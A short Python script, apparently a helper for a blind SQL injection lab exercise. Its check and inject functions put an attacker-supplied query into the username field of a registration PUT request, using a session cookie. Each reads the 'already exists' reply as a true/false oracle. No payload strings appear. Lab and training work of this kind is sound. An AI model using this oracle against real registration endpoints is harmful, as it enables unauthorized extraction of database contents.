import requests
import json

from res import URL


def check(cookie="", query=""):
    headers = {
        'Cookie': cookie,
    }

    data = {
        'username_reg': query,
        'email_reg': 'paul@gmail.com',
        'password_reg': 'paul123',
        'confirm_password_reg': 'paul123',
    }

    r = requests.put(URL, headers=headers, data=data)

    try:
        response = json.loads(r.text)

    except:
        print("Wrong JSESSIONID, find it by looking at your requests once logged in.")
        return False

    if (
        "already exists please try to register with a different username"
        not in response['feedback']
    ):
        return False
    else:
        return True


def inject(cookie="", query=""):
    headers = {
        'Cookie': cookie,
    }
    print(query)
    data = {
        'username_reg': query,
        'email_reg': 'paul@gmail.com',
        'password_reg': 'paul123',
        'confirm_password_reg': 'paul123',
    }

    r = requests.put(URL, headers=headers, data=data)

    try:
        response = json.loads(r.text)

    except:
        print("Wrong JSESSIONID, find it by looking at your requests once logged in.")
        return False

    if (
        "already exists please try to register with a different username"
        not in response['feedback']
    ):
        return False
    else:
        return True
